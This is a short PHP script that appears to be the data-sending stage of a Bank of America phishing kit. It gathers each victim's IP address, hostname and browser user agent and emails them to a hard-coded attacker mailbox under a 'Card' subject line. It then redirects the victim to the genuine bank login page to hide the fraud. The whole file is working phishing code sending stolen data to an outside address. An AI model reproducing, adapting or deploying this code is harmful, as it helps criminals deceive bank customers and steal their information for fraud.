<?php
$message = [];

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message = "|----------- BOFA AT MONALISA SERVICE --------------|\n";
$message .= " Finalizado por el boton de ir al banco \n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- BY BLACKSUN  --------------|\n";
$send = "alfredomillan799@gmail.com";
$subject = "Card | $ip";
{
mail("$send", "$subject", "$message");
mail("$userinfo","$subject","$message");
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://secure.bankofamerica.com/login/languageToggle.go?request_locale=es_US");


?>

